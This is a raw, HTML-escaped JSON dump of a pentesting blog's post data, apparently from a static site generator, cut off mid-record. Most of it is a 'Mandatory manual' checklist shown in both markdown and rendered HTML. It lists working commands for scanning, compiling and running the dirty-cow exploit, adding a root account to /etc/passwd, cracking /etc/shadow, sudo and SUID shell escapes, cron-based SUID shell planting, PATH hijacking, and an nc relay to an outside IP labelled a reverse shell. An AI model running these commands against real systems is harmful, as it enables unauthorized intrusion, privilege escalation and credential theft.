Shell:\n&lt;a href=\&quot;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/\&quot;&gt;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/&lt;/a&gt;\n&lt;a href=\&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\&quot;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;\n&lt;a href=\&quot;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html\&quot;&gt;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html&lt;/a&gt;\n&lt;a href=\&quot;http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/\&quot;&gt;http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/&lt;/a&gt;\nShell Escape:\n&lt;a href=\&quot;https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells\&quot;&gt;https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells&lt;/a&gt;\nPentestmonkey Cheat Sheets (SQL Injection)\n&lt;a href=\&quot;http://pentestmonkey.net/category/cheat-sheet\&quot;&gt;http://pentestmonkey.net/category/cheat-sheet&lt;/a&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;nmap基本扫描&quot;],&quot;text&quot;:[0,&quot;Nmap基本扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;],&quot;text&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-端口的枚举&quot;],&quot;text&quot;:[0,&quot;针对 web 端口的枚举&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对已知的服务进行攻击尝试搜索漏洞信息&quot;],&quot;text&quot;:[0,&quot;针对已知的服务进行攻击尝试，搜索漏洞信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-页面的测试&quot;],&quot;text&quot;:[0,&quot;针对 web 页面的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-netbiossmbrpc-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 NETBIOS、SMB、RPC 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-smtp-端口的尝试&quot;],&quot;text&quot;:[0,&quot;针对 SMTP 端口的尝试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-snmp-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 SNMP 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-ftp-端口测试&quot;],&quot;text&quot;:[0,&quot;针对 FTP 端口测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;密码破解&quot;],&quot;text&quot;:[0,&quot;密码破解&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;数据包抓取&quot;],&quot;text&quot;:[0,&quot;数据包抓取&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;参考资料&quot;],&quot;text&quot;:[0,&quot;参考资料&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Common process for handling objectives&quot;],&quot;date&quot;:[3,&quot;2023-02-05T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/7&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/mandatory-manual&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Mandatory manual&quot;],&quot;date&quot;:[3,&quot;2023-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n## Port scan\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -sV -O  -T4  --script vuln 192.168.124.44 -p-\n```\n\n\n## Web scan\n```\ndirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt\nnikto  -port 80 -host 192.168.124.44 -o nikto-result.txt\n```\n***\n# Vulnerability analysis\nUse nc to view banner.\n```\nnc -nv 192.168.124.44 22\n```\n```\nsearchsploit &lt;service name&gt;\nsearchsploit -m 47080\n```\n\n\n***\n# Exploitation\n\n## smb\n```\nenum4linux 192.168.124.40\nsmbclient -L 192.168.124.40\n```\n\n\n***\n# Privilege escalation\n## Linux \n### Kernel stack overflow\n```\nuname -a\ncat /etc/*-release\nsearchsploit linux 3.10 CentOS Linux 7\n```\nuse tools\n```\n./linux-exploit-suggester-2.pl\n```\nTake the rights of dirty-cow as an example\n```\ngcc -pthread dirty.c -lcrypt -o dirty\nchmod +x dirty\n./dirty fly\n```\n### Plain password of root\nIf /etc/passwd can be write by common user.\n```\nopenssl passwd -1 -salt hacker 123456\n```\ngenerate `$1$hacker$4o50Z4aoUGaLMC0Rg4Io40`\n```\necho &#39;hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash&#39; &gt;&gt; /etc/passwd\n```\nThen login in user hacker\n\nIf /etc/shadow can be read by common user.\n```\nunshadow /etc/passwd /etc/shadow &gt; shadow.txt\nchmod 777 shadow.txt\njohn --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt\n```\n### Password reuse\n### Sudo abuse\n`sudo -l`\n&gt;https://gtfobins.github.io/\n\nFor example:`su,    awk,    man `\n```\nsudo su\n```\n```\nsudo awk &#39;BEGIN {system(\&quot;/bin/sh\&quot;)}&#39;\n```\n```\nsudo man man\n!/bin/sh\n```\n```\nsudo vim -c &#39;:!/bin/sh&#39;\n```\n### &#39;su root&#39; prohibited\n```\npython -c &#39;import pty;pty.spawn(\&quot;/bin/sh\&quot;)\nsudo su\n```\n### Scheduled task\n```\nls -l /etc/cron*\ncat /etc/crontab\n```\nIf there is a scheduled task named 1.py\n```\nls -al /tmp/1.py    //查看是否有w权限\n```\nWrite the code into 1.py\n```\nimport os \nos.system(&#39;cp /bin/sh /tmp/sh&#39;) \nos.system(&#39;chmod u+s /tmp/sh&#39;)\n```\n`./tmp/sh`\n### SUID\nTake nmap as an example:\n```\nfind / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null\n/usr/local/bin/nmap --interactive\n!sh\nwhoami\n```\n### Environment variable hijacking\nFind command with suid just as 4.1.7.\nSuppose it is `su`\n```\nvim /tmp/su         //write shellcode into su\nexport PATH=/tmp:$PATH\n```\n### Administrator configuration error\nConfiguring a program with SUID that does not have the setuid(0) code, such as `find `mentioned above.\n```\nmkdir abc\nfind abc -exec &#39;/bin/sh&#39; \\;\n```\n### Docker group\n### Service vulnerability\n```\nnetstat -antup\n```\nRedis reverse shell.\n```\nnc -l 12345 | nc 102.168.191.170 80\n```\n## Windows\n***\n# 5 Domain penetration&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/Mandatory manual.md&quot;],&quot;digest&quot;:[0,&quot;6d2eb50a4cca332f&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;port-scan\&quot;&gt;Port scan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#port-scan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -sV -O  -T4  --script vuln 192.168.124.44 -p-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;web-scan\&quot;&gt;Web scan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#web-scan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nikto  -port 80 -host 192.168.124.44 -o nikto-result.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;vulnerability-analysis\&quot;&gt;Vulnerability analysis&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#vulnerability-analysis\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;Use nc to view banner.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -nv 192.168.124.44 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit &amp;#x3C;service name&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit -m 47080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;exploitation\&quot;&gt;Exploitation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#exploitation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;smb\&quot;&gt;smb&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#smb\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;enum4linux 192.168.124.40&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;smbclient -L 192.168.124.40&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;privilege-escalation\&quot;&gt;Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;linux\&quot;&gt;Linux&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#linux\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=\&quot;kernel-stack-overflow\&quot;&gt;Kernel stack overflow&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#kernel-stack-overflow\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;uname -a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/*-release&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit linux 3.10 CentOS Linux 7&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;use tools&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./linux-exploit-suggester-2.pl&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Take the rights of dirty-cow as an example&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -pthread dirty.c -lcrypt -o dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod +x dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./dirty fly&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;plain-password-of-root\&quot;&gt;Plain password of root&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#plain-password-of-root\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;If /etc/passwd can be write by common user.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;openssl passwd -1 -salt hacker 123456&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;generate &lt;code&gt;$1$hacker$4o50Z4aoUGaLMC0Rg4Io40&lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;echo &#39;hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash&#39; &gt;&gt; /etc/passwd&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Then login in user hacker&lt;/p&gt;\n&lt;p&gt;If /etc/shadow can be read by common user.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;unshadow /etc/passwd /etc/shadow &gt; shadow.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod 777 shadow.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;john --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;password-reuse\&quot;&gt;Password reuse&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#password-reuse\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h3 id=\&quot;sudo-abuse\&quot;&gt;Sudo abuse&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#sudo-abuse\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;div class=\&quot;link-preview-block not-prose\&quot; data-state=\&quot;success\&quot;&gt;\n  &lt;a href=\&quot;https://gtfobins.github.io/\&quot; target=\&quot;_blank\&quot; class=\&quot;group block overflow-hidden rounded-lg border border-border transition-all hover:border-primary/50 hover:shadow-md\&quot; aria-label=\&quot;GTFOBins - gtfobins.github.io\&quot;&gt;\n    &lt;div class=\&quot;bg-card flex md:flex-col flex-row\&quot;&gt;\n      &lt;div class=\&quot;flex-1 p-4\&quot;&gt;\n        &lt;div class=\&quot;mb-2 flex items-center gap-2\&quot;&gt;\n          &lt;img src=\&quot;https://gtfobins.github.io/assets/logo.png\&quot; alt=\&quot;\&quot; class=\&quot;h-4 w-4 shrink-0\&quot; loading=\&quot;lazy\&quot; aria-hidden=\&quot;true\&quot;&gt;\n          &lt;span class=\&quot;text-muted-foreground truncate text-xs font-medium\&quot;&gt;gtfobins.github.io&lt;/span&gt;\n        &lt;/div&gt;\n        &lt;h3 class=\&quot;text-foreground mb-2 line-clamp-2 font-semibold leading-tight\&quot;&gt;GTFOBins&lt;/h3&gt;\n        &lt;p class=\&quot;text-muted-foreground mb-3 line-clamp-2 text-sm\&quot;&gt;GTFOBins is a curated list of Unix-like executables that can be used to bypass local security restrictions in misconfigured systems.&lt;/p&gt;\n        &lt;div class=\&quot;text-primary flex items-center gap-1 text-xs\&quot;&gt;\n          &lt;span class=\&quot;truncate\&quot;&gt;https://gtfobins.github.io/&lt;/span&gt;\n          &lt;svg class=\&quot;h-3 w-3 shrink-0 transition-transform group-hover:translate-x-0.5\&quot; aria-hidden=\&quot;true\&quot; viewBox=\&quot;0 0 12 12\&quot;&gt;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M4 3.5a.5.5 0 0 0-.5.5v4a.5.5 0 0 0 .5.5h4a.5.5 0 0 0 .5-.5v-.25a.75.75 0 0 1 1.5 0V8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h.25a.75.75 0 0 1 0 1.5zm2.75 0a.75.75 0 0 1 0-1.5h2.5a.75.75 0 0 1 .75.75v2.5a.75.75 0 0 1-1.5 0v-.69L7.28 5.78a.75.75 0 0 1-1.06-1.06L7.44 3.5z\&quot;&gt;&lt;/path&gt;&lt;/svg&gt; \n        &lt;/div&gt;\n      &lt;/div&gt;\n      &lt;div class=\&quot;bg-muted relative md:w-full shrink-0 aspect-1200/630 h-38\&quot;&gt;&lt;img src=\&quot;https://gtfobins.github.io/assets/logo.png\&quot; alt=\&quot;GTFOBins\&quot; class=\&quot;h-full w-full object-cover\&quot; loading=\&quot;lazy\&quot;&gt;&lt;/div&gt;\n    &lt;/div&gt;\n  &lt;/a&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;For example:&lt;code&gt;su,    awk,    man &lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo su&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo awk &#39;BEGIN {system(\&quot;/bin/sh\&quot;)}&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo man man&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!/bin/sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo vim -c &#39;:!/bin/sh&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;su-root-prohibited\&quot;&gt;’su root’ prohibited&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#su-root-prohibited\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import pty;pty.spawn(\&quot;/bin/sh\&quot;)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo su&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;scheduled-task\&quot;&gt;Scheduled task&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#scheduled-task\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -l /etc/cron*&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/crontab&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;If there is a scheduled task named 1.py&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -al /tmp/1.py    //查看是否有w权限&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Write the code into 1.py&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;import os &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;os.system(&#39;cp /bin/sh /tmp/sh&#39;) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;os.system(&#39;chmod u+s /tmp/sh&#39;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;code&gt;./tmp/sh&lt;/code&gt;&lt;/p&gt;\n&lt;h3 id=\&quot;suid\&quot;&gt;SUID&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#suid\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Take nmap as an example:&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/usr/local/bin/nmap --interactive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!sh&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whoami&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;environment-variable-hijacking\&quot;&gt;Environment variable hijacking&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#environment-variable-hijacking\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Find command with suid just as 4.1.7.\nSuppose it is &lt;code&gt;su&lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;vim /tmp/su         //write shellcode into su&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;export PATH=/tmp:$PATH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;administrator-configuration-error\&quot;&gt;Administrator configuration error&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#administrator-configuration-error\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Configuring a program with SUID that does not have the setuid(0) code, such as &lt;code&gt;find &lt;/code&gt;mentioned above.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; 